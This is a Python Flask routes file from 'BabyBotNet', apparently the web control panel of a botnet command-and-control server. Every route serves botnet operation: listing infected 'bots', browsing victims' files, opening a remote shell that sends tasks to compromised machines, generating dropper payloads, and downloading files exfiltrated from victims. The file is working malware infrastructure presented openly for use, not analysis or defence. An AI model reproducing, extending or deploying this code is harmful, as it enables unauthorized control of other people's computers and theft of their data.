#!/usr/bin/python
# -*- coding: utf-8 -*-
"""Routes (BabyBotNet)"""

import os
import sys
import json
import shutil
from datetime import datetime

from flask import current_app, Blueprint, flash, redirect, render_template, request, url_for, send_from_directory
from flask_login import login_user, logout_user, current_user, login_required

from BabyServer import  c2
from BabyServer.core.dao import file_dao, payload_dao, session_dao
from BabyServer.users.forms import RegistrationForm, LoginForm, UpdateAccountForm
from BabyServer.models import db, bcrypt, User, Session
from BabyServer.utils import get_sessions_serialized, get_tasks_serialized

# Blueprint
main = Blueprint('main', __name__)

# Globals
OUTPUT_DIR = os.path.abspath('BabyServer/output')

# Routes
@main.route("/dashboard")
@main.route("/sessions", methods=["GET"])
@login_required
def sessions():
	"""Display active/inactive sessions"""
	sessions = get_sessions_serialized(current_user.id)
	return render_template("sessions.html", sessions=sessions, n=len(sessions), title="Control Panel")


@main.route("/payloads")
@login_required
def payloads():
	"""Page for creating custom client scripts. Custom client scripts are generated on this page by sending user inputted values to 
	the '/generate' API endpoint, which writes the dropper to the user's output directory."""
	payloads = payload_dao.get_user_payloads(current_user.id)
	return render_template("payloads.html", 
							payloads=payloads, 
							owner=current_user.username, 
							title="Payloads")
 
 
 
@main.route("/flist")
@login_required
def flist():
	session_uid = request.args.get('session_uid')
	path = request.args.get('path')
 
	# validate session id is valid integer
	if not session_uid:
		flash("Invalid bot UID: {}".format(session_uid))
		return redirect(url_for('main.sessions'))

	# get current user sessions
	owner_sessions = c2.sessions.get(current_user.username)

	# check if owner has any active sessions
	if not owner_sessions:
		session_dao.update_session_status(session_uid, 0)
		flash("You have no bots online.", "danger")
		return redirect(url_for('main.sessions'))

	# check if requested session is owned by current user
	if session_uid not in owner_sessions:
		session_dao.update_session_status(session_uid, 0)
		flash("Invalid bot UID: " + str(session_uid))
		return redirect(url_for('main.sessions'))

	# get requested session
	session_thread = owner_sessions.get(session_uid)
	import urllib
	to_quote = lambda s: urllib.parse.quote_plus(s.encode('UTF-8'))
	to_path = lambda name: to_quote(path + '\\' + name if len(path) > 0 else name)
	# if session is online, authenticate user and enter shell
	if session_thread:
		if session_thread.info['owner'] == current_user.username:
			files = session_thread.list_dir_file(path)
			file2 = []
			folder = []
   
			print("DEBUG RETURN PATH ========> ",path)
			if(path != ""):
				listpath = path.split("\\")
				nearpath = to_quote('\\'.join(listpath[: -1]))
				return_near_path = ("folder", "..", nearpath)
				folder.append(return_near_path)
			if(files is not None):
		
				for index, item in enumerate(files):
					itemlist = list(item)
					if(itemlist[0] is None):
						itemlist[0] = "folder"
						if("{{{$" in itemlist[1]): 
							continue
					# print("kiet check ==> itemlist[1] ",itemlist[1],to_path(itemlist[1]))
						itemlist.append(to_path(itemlist[1]))
			
						item = tuple(itemlist)
						
						folder.append(item)
						# print("check folder  => ", item)
					else:
						itemlist.append(to_path(itemlist[1]))
						item = tuple(itemlist)
						file2.append(item)

				folder += file2

				print("DEBUG FLIST ====> ", folder)


			return render_template("filelist.html", 
									session_uid=session_uid, 
									files=folder, 
									path = path,
									title="Files")
		else:
			flash("Bot not owned by current user.", "danger")
			return redirect(url_for('main.sessions'))

	# if bot is offline, update status in database and notify user
	else:
		session_dao.update_session_status(session_uid, 0)
		flash("Bot is offline.", "danger")
		return redirect(url_for('main.sessions'))



@main.route("/files")
@login_required
def files():
	"""Page for displaying files exfiltrated from client machines"""
	user_files = file_dao.get_user_files(current_user.id)
	return render_template("files.html", 
							files=user_files, 
							owner=current_user.username, 
							title="Files")


@main.route("/")
def home():
	"""Home page"""
	return render_template("home.html")


@main.route("/docs")
def docs():
	"""Project documentation."""
	return render_template("how-it-works.html", title="How It Works")


@main.route("/guide")
def guide():
	"""Quick start guide."""
	return render_template("guide.html", title="Guide")


@main.route("/faq")
def faq():
	"""FAQ page."""
	return render_template("faq.html", title="FAQ")


@main.route("/shell")
@login_required
def shell():
	"""Interact with a client session. Commands entered in JQuery terminal on the front-end are sent to back to the 
	Python back-end via POST to the API endpoint /cmd, where it can directly 
	call the C2 server's send_task and recv_task methods to transmit encrypted
	tasks/results via TCP connection."""
	session_uid = request.args.get('session_uid')

	# validate session id is valid integer
	if not session_uid:
		flash("Invalid bot UID: {}".format(session_uid))
		return redirect(url_for('main.sessions'))

	# get current user sessions
	owner_sessions = c2.sessions.get(current_user.username)

	# check if owner has any active sessions
	if not owner_sessions:
		session_dao.update_session_status(session_uid, 0)
		flash("You have no bots online.", "danger")
		return redirect(url_for('main.sessions'))

	# check if requested session is owned by current user
	if session_uid not in owner_sessions:
		session_dao.update_session_status(session_uid, 0)
		flash("Invalid bot UID: " + str(session_uid))
		return redirect(url_for('main.sessions'))

	# get requested session
	session_thread = owner_sessions.get(session_uid)

	# if session is online, authenticate user and enter shell
	if session_thread:
		if session_thread.info['owner'] == current_user.username:
			return render_template("shell.html", 
									session_uid=session_uid, 
									info=session_thread.info, 
									title="Shell")
		else:
			flash("Bot not owned by current user.", "danger")
			return redirect(url_for('main.sessions'))

	# if bot is offline, update status in database and notify user
	else:
		session_dao.update_session_status(session_uid, 0)
		flash("Bot is offline.", "danger")
		return redirect(url_for('main.sessions'))


@main.route("/tasks", methods=["GET"])
@login_required
def tasks():
	"""Task history for a client"""
	session_uid = request.args.get('session_uid')

	# get serialized task history from database
	tasks = get_tasks_serialized(session_uid)

	# show task history as a table
	return render_template("tasks.html", 
							tasks=tasks, 
							session_uid=session_uid,
							title="Tasks")


#####################
#
# DOWNLOADS
#
#####################

@main.route("/output/<user>/src/dist/<operating_system>/<filename>")
@login_required
def download_executable(user, operating_system, filename):
	"""Download user generated binary executable payload."""
	return send_from_directory(os.path.join(OUTPUT_DIR, user, 'src', 'dist', operating_system), filename, as_attachment=True)


@main.route("/output/<user>/src/<filename>")
@login_required
def download_payload(user, filename):	
	"""Download user generated Python payload."""
	return send_from_directory(os.path.join(OUTPUT_DIR, user, 'src'), filename, as_attachment=True)


@main.route("/output/<user>/files/<filename>")
@login_required
def download_file(user, filename):
	"""Download user exfiltrated file."""
	return send_from_directory(os.path.join(OUTPUT_DIR, user, 'files'), filename, as_attachment=True)
